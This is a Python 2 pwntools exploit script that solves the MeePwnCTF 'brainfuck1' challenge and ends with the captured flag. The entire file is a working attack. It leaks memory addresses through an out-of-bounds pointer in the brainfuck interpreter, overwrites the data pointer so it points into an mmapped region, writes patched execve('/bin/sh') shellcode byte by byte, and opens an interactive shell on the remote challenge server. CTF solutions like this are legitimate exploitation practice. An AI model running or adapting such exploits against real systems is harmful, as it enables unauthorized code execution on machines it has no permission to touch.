#!/usr/bin/env python2

from pwn import *
import struct

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
# http://shell-storm.org/shellcode/files/shellcode-806.php
SC = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# we need to patch the first byte cause we will override a ret instruction
SC = chr((ord(SC[0]) - 0xc3) & 0xff) + SC[1:]

###

if DEBUG:
    r = process('./brainfuck1_b8e88a368c439081aafca37cb2d8c2a5', aslr=False)
else:
    r = remote('139.59.244.42', 31337)

GDB = True
if GDB and DEBUG:
    baseaddr = 0x0000555555554000
    bps = [ 0x1FBE ]
    breakpoints = ''
    for x in bps:
        breakpoints += 'b *%#x\n' % (baseaddr + x)
    gdb.attach(r, breakpoints)

r.recvuntil('>> ')
# first brainfuck is to leak the data we will modify
bf  = '<' * 0x21
bf += '.<' * 0x10

r.sendline(bf)
d = r.recvuntil('>> ')
mmap = struct.unpack('>Q', d[0:8])[0]
heap = struct.unpack('>Q', d[8:16])[0] & ~0xfff
log.info('mmap: %#x' % mmap)
log.info('heap: %#x' % heap)

# now we overwrite the data pointer to the mmapped chunk
bf  = '<' * 0x30
bf += ',>' * 0x8
r.sendline(bf)
r.send(p64(mmap + 0xcd))
r.recvuntil('>> ')

# now writing shellcode and executing it
bf  = ''
for x in SC:
    bf += '+' * ord(x)
    bf += '>'
r.sendline(bf)

r.interactive()
r.close()

# MeePwnCTF{this_is_simple_challenge_:banana-dance:}
